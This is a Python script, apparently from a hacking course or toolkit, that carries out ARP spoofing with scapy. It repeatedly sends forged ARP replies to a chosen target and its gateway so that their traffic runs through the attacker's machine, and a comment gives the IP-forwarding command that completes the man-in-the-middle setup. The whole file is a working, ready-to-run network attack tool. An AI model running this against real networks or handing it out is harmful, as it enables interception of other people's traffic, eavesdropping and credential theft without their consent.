#! /usr/bin/env python

#Python3

import time
import scapy.all as scapy
import argparse

# set port forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="IP of the target")
    parser.add_argument("-g", "--gateway", dest="gateway", help="IP of the gateway")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify ip for the target, use --help for more info.")
    elif not options.gateway:
        parser.error("[-] Please specify ip for the gateway, use --help for more info.")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
# "10.0.2.6"
# "10.0.2.1"

target_ip = options.target
gateway_ip = options.gateway
print("\nARP spoofing target IP: " + options.target)
print("ARP spoofing gateway IP: " + options.gateway)
print("\n-------------------------------------------------------------\n")


try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n\r[+] Detected CTRL + C ..... Resetting ARP tables, please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)